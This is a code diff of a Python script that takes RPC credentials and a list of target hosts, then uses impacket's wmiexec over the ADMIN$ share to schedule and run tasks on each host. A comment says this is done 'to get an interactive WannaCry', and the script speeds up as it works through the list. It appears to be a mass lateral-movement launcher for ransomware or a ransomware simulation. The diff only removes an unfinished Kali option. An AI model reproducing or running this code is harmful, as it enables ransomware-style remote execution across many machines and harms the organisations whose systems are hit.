@@ -16,7 +16,6 @@ pause = 2
 parser = argparse.ArgumentParser()
 parser.add_argument('--username', required=True, help='username (with RPC privileges)')
 parser.add_argument('--password', required=True, help='password')
-parser.add_argument('--kali', action='store_true', help='specify that you\'re running on Kali')
 parser.add_argument('--pause', metavar='SECONDS', type=int)
 parser.add_argument('--hosts', metavar='FILES', required=True, help='file(s) with hostnames/ip-addresses to targets, if empty, stdin is used')
 args = parser.parse_args()
@@ -36,17 +35,11 @@ for i, host in enumerate(hosts):
 		print('Waiting for {0:f} seconds'.format(pause))
 		time.sleep(pause)
 	print(host)
-	if args.kali:
-		print('todo')
-		#TODO:
-		#wmiexec
-		#change color
-	else:
-		# To get an interactive WannaCry, we need to schedule, and then run
-		wmiobj = wmiexec.WMIEXEC(sch_task, username, password, noOutput=True, share='ADMIN$')
-		wmiobj.run(host)
-		wmiobj = wmiexec.WMIEXEC(exec_task, username, password, noOutput=True, share='ADMIN$')
-		wmiobj.run(host)
+	# To get an interactive WannaCry, we need to schedule, and then run
+	wmiobj = wmiexec.WMIEXEC(sch_task, username, password, noOutput=True, share='ADMIN$')
+	wmiobj.run(host)
+	wmiobj = wmiexec.WMIEXEC(exec_task, username, password, noOutput=True, share='ADMIN$')
+	wmiobj.run(host)
 	if i > j / 6: # Accellerate
 		pause = pause * 0.6
 
